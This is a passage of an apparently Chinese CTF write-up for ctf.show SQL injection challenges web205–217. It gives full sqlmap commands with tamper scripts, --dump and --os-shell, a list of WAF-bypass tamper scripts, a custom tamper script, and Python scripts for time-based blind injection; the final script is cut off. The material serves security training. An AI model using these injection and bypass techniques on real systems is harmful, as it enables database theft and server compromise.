+<pre class="line-numbers language-none"><code class="language-none">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;d04b499a-1159-43c6-b8aa-3b35a5f40e8b.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; -safe-url&#x3D;&quot;http:&#x2F;&#x2F;d04b499a-1159-43c6-b8aa-3b35a5f40e8b.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --method&#x3D;&quot;put&quot; --headers&#x3D;&quot;content-type:text&#x2F;plain&quot; -safe-freq&#x3D;1 --dump --batch --referer&#x3D;&quot;http:&#x2F;&#x2F;d04b499a-1159-43c6-b8aa-3b35a5f40e8b.challenge.ctf.show:8080&#x2F;sqlmap.php&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;dbee2h213qohj1kktovej8hstp&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="Web206"><a href="#Web206" class="headerlink" title="Web206"></a>Web206</h2><ul>
+<li>仍然有安全链接设置</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsnlrx130oj30zk0j576q.jpg" alt="image-20210720184320625"></p>
+<ul>
+<li>payload：</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;d379cfef-c357-4216-8862-241cb2565027.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;k2p9umcfdkl78pdf11houjsddv&quot; -safe-url&#x3D;&quot;http:&#x2F;&#x2F;d379cfef-c357-4216-8862-241cb2565027.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; -safe-freq&#x3D;1 --method&#x3D;&quot;put&quot; --referer&#x3D;&quot;http:&#x2F;&#x2F;d379cfef-c357-4216-8862-241cb2565027.challenge.ctf.show:8080&#x2F;sqlmap.php&quot; --headers&#x3D;&quot;content-type:text&#x2F;plain&quot; --dump --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web207-tamper的使用"><a href="#web207-tamper的使用" class="headerlink" title="web207(tamper的使用)"></a>web207(tamper的使用)</h2><pre class="line-numbers language-none"><code class="language-none">--tamper &#x2F;&#x2F;使用给定的脚本篡改注入的数据
+
+space2comment.py用&#x2F;**&#x2F;代替空格
+
+apostrophemask.py用utf8代替引号
+
+equaltolike.py like代替等号
+
+space2dash.py　绕过过滤‘&#x3D;’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）
+
+greatest.py　绕过过滤’&gt;’ ,用GREATEST替换大于号。
+
+space2hash.py空格替换为#号,随机字符串以及换行符
+
+apostrophenullencode.py绕过过滤双引号，替换字符和双引号。
+
+halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论
+
+space2morehash.py空格替换为 #号 以及更多随机字符串 换行符
+
+appendnullbyte.py在有效负荷结束位置加载零字节字符编码
+
+ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’
+
+space2mssqlblank.py(mssql)空格替换为其它空符号
+
+base64encode.py　用base64编码替换
+
+space2mssqlhash.py　替换空格
+
+modsecurityversioned.py过滤空格，包含完整的查询版本注释
+
+space2mysqlblank.py　空格替换其它空白符号(mysql)
+
+between.py用between替换大于号（&gt;）
+
+space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）
+
+multiplespaces.py围绕SQL关键字添加多个空格
+
+space2plus.py用+替换空格
+
+bluecoat.py代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换&#x3D;为like
+
+nonrecursivereplacement.py双重查询语句,取代SQL关键字
+
+space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集
+
+sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾
+
+chardoubleencode.py双url编码(不处理以编码的)
+
+unionalltounion.py替换UNION ALLSELECT UNION SELECT
+
+charencode.py　url编码
+
+randomcase.py 随机大小写
+
+unmagicquotes.py宽字符绕过 GPCaddslashes
+
+randomcomments.py用&#x2F;**&#x2F;分割sql关键字
+
+charunicodeencode.py字符串 unicode 编码
+
+securesphere.py追加特制的字符串
+
+versionedmorekeywords.py注释绕过
+
+space2comment.py替换空格字符串(‘‘) 使用注释‘&#x2F;**&#x2F;’
+
+halfversionedmorekeywords.py关键字前加注释<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>过滤了空格用<code>/**/</code>代替</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;dfb00f7e-3234-45b6-88b9-4664c9d70734.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;3drctaecc09avaln6bdgb2fdp3&quot; -safe-url&#x3D;&quot;http:&#x2F;&#x2F;dfb00f7e-3234-45b6-88b9-4664c9d70734.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; -safe-freq&#x3D;1 --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;put&quot; --headers&#x3D;&quot;content-type:text&#x2F;plain&quot; --tamper&#x3D;&quot;tamper&#x2F;space2comment.py&quot; --referer&#x3D;&quot;http:&#x2F;&#x2F;dfb00f7e-3234-45b6-88b9-4664c9d70734.challenge.ctf.show:8080&#x2F;sqlmap.php&quot; --dump --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web208-tamper的大小写脚本使用"><a href="#web208-tamper的大小写脚本使用" class="headerlink" title="web208(tamper的大小写脚本使用)"></a>web208(tamper的大小写脚本使用)</h2><ul>
+<li>过滤了空格，<code>select</code>但可以大小写绕过</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;b432156d-8a84-481b-b904-b269d2389197.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --tamper&#x3D;&quot;tamper&#x2F;space2comment.py,tamper&#x2F;randomcase.py&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;i9mlq204vm3h45vuffq60amplr&quot; -safe-url&#x3D;&quot;http:&#x2F;&#x2F;b432156d-8a84-481b-b904-b269d2389197.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; -safe-freq&#x3D;1 --referer&#x3D;&quot;http:&#x2F;&#x2F;b432156d-8a84-481b-b904-b269d2389197.challenge.ctf.show:8080&#x2F;sqlmap.php&quot; --method&#x3D;&quot;put&quot; --headers&#x3D;&quot;content-type:text&#x2F;plain&quot; --dump --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="Web209-过滤空格和-以及"><a href="#Web209-过滤空格和-以及" class="headerlink" title="Web209(过滤空格和*以及=)"></a>Web209(过滤空格和*以及=)</h2><ul>
+<li></li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//拼接sql语句查找指定ID用户</span>
+$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token punctuation">.</span>$id<span class="token punctuation">.</span><span class="token string">"' limit 0,1;"</span><span class="token punctuation">;</span>
+      
+返回逻辑
+<span class="token comment">//对传入的参数进行了过滤</span>
+  <span class="token keyword">function</span> waf<span class="token punctuation">(</span>$str<span class="token punctuation">)</span>&#123;
+   <span class="token comment">//TODO 未完工</span>
+   <span class="token keyword">return</span> preg_match<span class="token punctuation">(</span><span class="token string">'/ |\*|\=/'</span><span class="token punctuation">,</span> $str<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  &#125;
+      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>把space2comment的脚本中的/**/改为chr(0x0a)（去掉双引号）</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;d16e3ec7-7734-4681-b047-652df18cf145.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;13pcscup4tnhs7bb964tc4ag8l&quot; --method&#x3D;&quot;put&quot; --headers&#x3D;&quot;content-type:text&#x2F;plain&quot; --referer&#x3D;&quot;http:&#x2F;&#x2F;d16e3ec7-7734-4681-b047-652df18cf145.challenge.ctf.show:8080&#x2F;sqlmap.php&quot; -safe-url&#x3D;&quot;http:&#x2F;&#x2F;d16e3ec7-7734-4681-b047-652df18cf145.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; -safe-freq&#x3D;1 --tamper&#x3D;&quot;tamper&#x2F;space2comment.py,tamper&#x2F;equaltolike.py&quot; --dump --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="Web210-按照逻辑写tamper脚本"><a href="#Web210-按照逻辑写tamper脚本" class="headerlink" title="Web210(按照逻辑写tamper脚本)"></a>Web210(按照逻辑写tamper脚本)</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">!<span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>env python
+
+<span class="token triple-quoted-string string">"""
+Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)
+See the file 'LICENSE' for copying permission
+"""</span>
+
+<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
+<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
+<span class="token keyword">import</span> base64
+
+__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW
+
+<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">pass</span>
+
+<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+
+    retVal <span class="token operator">=</span> payload
+
+    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
+        retVal<span class="token operator">=</span>retVal<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">//</span>按utf<span class="token operator">-</span><span class="token number">8</span>编码
+        retVal<span class="token operator">=</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+        retVal<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span>
+        retVal<span class="token operator">=</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+        retVal<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> retVal<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token operator">//</span>按utf<span class="token operator">-</span><span class="token number">8</span>解码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-none"><code class="language-none">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;0b45569c-bf90-4f03-aa09-5a57af9cd98e.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;l5jtrkb3miaiuu9cr1u9tu6u8o&quot; -safe-url&#x3D;&quot;http:&#x2F;&#x2F;0b45569c-bf90-4f03-aa09-5a57af9cd98e.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; -safe-freq&#x3D;1 --referer&#x3D;&quot;http:&#x2F;&#x2F;0b45569c-bf90-4f03-aa09-5a57af9cd98e.challenge.ctf.show:8080&#x2F;sqlmap.php&quot; --tamper&#x3D;&quot;tamper&#x2F;web210.py&quot; --method&#x3D;&quot;put&quot; --headers&#x3D;&quot;content-type:text&#x2F;plain&quot; --dump --batch --fresh-queries <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h2><ul>
+<li>先把空格替换成/**/再完成反转</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;94905dd8-f5b7-449c-a3c3-62c8738ebc0b.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;rbsuvh212hagobgk4l0hsml1sb&quot; --referer&#x3D;&quot;http:&#x2F;&#x2F;94905dd8-f5b7-449c-a3c3-62c8738ebc0b.challenge.ctf.show:8080&#x2F;sqlmap.php&quot;  --tamper&#x3D;&quot;tamper&#x2F;space2comment.py,tamper&#x2F;web210.py&quot; -safe-url&#x3D;&quot;http:&#x2F;&#x2F;94905dd8-f5b7-449c-a3c3-62c8738ebc0b.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; -safe-freq&#x3D;1 --method&#x3D;&quot;put&quot; --headers&#x3D;&quot;content-type:text&#x2F;plain&quot; --dump --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h2><ul>
+<li>把空格换成chr(0x0a)</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;116d62c7-44ff-43a8-89c5-2170adcb1c1f.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;http:&#x2F;&#x2F;116d62c7-44ff-43a8-89c5-2170adcb1c1f.challenge.ctf.show:8080&#x2F;sqlmap.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;put&quot; --headers&#x3D;&quot;content-type:text&#x2F;plain&quot; -safe-url&#x3D;&quot;http:&#x2F;&#x2F;116d62c7-44ff-43a8-89c5-2170adcb1c1f.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; -safe-freq&#x3D;1 --dump --batch --tamper&#x3D;&quot;tamper&#x2F;space2comment.py,tamper&#x2F;web210.py&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web213-–os-shell"><a href="#web213-–os-shell" class="headerlink" title="web213(–os-shell)"></a>web213(–os-shell)</h2><ul>
+<li>利用os-shell进入shell</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;5676d22a-da16-4ac9-b4df-d9b1bdf570c5.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; -safe-url&#x3D;&quot;http:&#x2F;&#x2F;5676d22a-da16-4ac9-b4df-d9b1bdf570c5.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; -safe-freq&#x3D;1 --dump --os-shell --batch --referer&#x3D;&quot;http:&#x2F;&#x2F;5676d22a-da16-4ac9-b4df-d9b1bdf570c5.challenge.ctf.show:8080&#x2F;sqlmap.php&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;sis1juopirdciokk8e2kaoivkc&quot; --method&#x3D;&quot;put&quot; --headers&#x3D;&quot;content-type:text&#x2F;plain&quot; --tamper&#x3D;&quot;tamper&#x2F;space2comment.py,tamper&#x2F;web210.py&quot; --data&#x3D;&quot;id&#x3D;1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>可用的命令有<code>ls</code>,<code>nl</code></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">ls 查看根目录
+ls &#x2F;
+nl 输出flag文件
+nl &#x2F;ctfshow_flag <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsocf2z1y8j30fu0abmxk.jpg" alt="image-20210721100509981"></p>
+<h2 id="web214-时间盲注"><a href="#web214-时间盲注" class="headerlink" title="web214(时间盲注)"></a>web214(时间盲注)</h2><p>二分法脚本</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://c10e61eb-3a64-4ea4-ba5d-46a5327683b8.challenge.ctf.show:8080/api/"</span>
+
+
+flag <span class="token operator">=</span> <span class="token string">''</span>
+i<span class="token operator">=</span><span class="token number">0</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span>
+    header <span class="token operator">=</span> <span class="token number">32</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+    <span class="token keyword">while</span> header <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>header <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
+        <span class="token comment">#payload = "select flaga from ctfshow_web.ctfshow_flagx"</span>
+        <span class="token comment">#payload = "select database()"</span>
+        <span class="token comment">#payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'" #id,flaga,info</span>
+        payload <span class="token operator">=</span> <span class="token string">"select group_concat(table_name) from information_schema.tables where table_schema=database()"</span> <span class="token comment">#ctfshow_flagx,ctfshow_info</span>
+        <span class="token comment">#print(payload)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1)"</span></span><span class="token punctuation">,</span>
+            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'0'</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token comment">#print(s.text)</span>
+            tail <span class="token operator">=</span> mid
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            header <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
+    <span class="token keyword">if</span> header <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
+        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web215时间盲注-有单引号"><a href="#web215时间盲注-有单引号" class="headerlink" title="web215时间盲注(有单引号)"></a>web215时间盲注(有单引号)</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://c10e61eb-3a64-4ea4-ba5d-46a5327683b8.challenge.ctf.show:8080/api/"</span>
+
+
+flag <span class="token operator">=</span> <span class="token string">''</span>
+i<span class="token operator">=</span><span class="token number">0</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span>
+    header <span class="token operator">=</span> <span class="token number">32</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+    <span class="token keyword">while</span> header <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>header <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
+        payload <span class="token operator">=</span> <span class="token string">"select flagaa from ctfshow_web.ctfshow_flagxc"</span>
+        <span class="token comment">#payload = "select database()"</span>
+        <span class="token comment">#payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'" #id,flagaa,info</span>
+        <span class="token comment">#payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()" #ctfshow_flagxc,ctfshow_info</span>
+        <span class="token comment">#print(payload)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1) and '1'='1"</span></span><span class="token punctuation">,</span>
+            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'0'</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token comment">#print(s.text)</span>
+            tail <span class="token operator">=</span> mid
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            header <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
+    <span class="token keyword">if</span> header <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
+        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><p><a target="_blank" rel="noopener" href="https://www.yisu.com/zixun/116297.html">from_base64(str)</a></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://5b9ae003-56b4-4c84-bdb9-810776e85167.challenge.ctf.show:8080/api/"</span>
+
+
+flag <span class="token operator">=</span> <span class="token string">''</span>
+i<span class="token operator">=</span><span class="token number">0</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span>
+    header <span class="token operator">=</span> <span class="token number">32</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+    <span class="token keyword">while</span> header <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>header <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
+        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_web.ctfshow_flagxcc"</span>
+        <span class="token comment">#payload = "select database()"</span>
+        <span class="token comment">#payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'" #id,flagaac,info,</span>
+        <span class="token comment">#payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()" #ctfshow_flagxcc,cthshow_info&amp;</span>
+        <span class="token comment">#print(payload)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"'MQ==') or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1"</span></span><span class="token punctuation">,</span>
+            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'0'</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token comment">#print(s.text)</span>
+            tail <span class="token operator">=</span> mid
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            header <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
+    <span class="token keyword">if</span> header <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
+        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Web217-过滤sleep的盲注"><a href="#Web217-过滤sleep的盲注" class="headerlink" title="Web217(过滤sleep的盲注)"></a>Web217(过滤sleep的盲注)</h2><p><strong>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 参 数可以是需要执行的次数和表达式。 表达式可以是任何的标量表达式，比如返回值 是标量的子查询或者函数。 该函数可以很方便地测试某些特定操作的性能，比如通过测试可以发现，MDS()函数比SHAl()函数要快：</strong></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://2e14a567-cf3b-49a8-9297-a6c19c2357db.challenge.ctf.show:8080/api/"</span>
+
+
+flag <span class="token operator">=</span> <span class="token string">''</span>
+i<span class="token operator">=</span><span class="token number">0</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span>
+    header <span class="token operator">=</span> <span class="token number">32</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+    <span class="token keyword">while</span> header <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>header <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
+        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_web.ctfshow_flagxccb"</span>
+        <span class="token comment">#payload = "select database()"</span>
+        <span class="token comment">#payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxccb'" #id,flagaabc,info</span>
+        <span class="token comment">#payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()" #ctfshow_flagxccb,ctfshow_info</span>
+        <span class="token comment">#print(payload)</span>
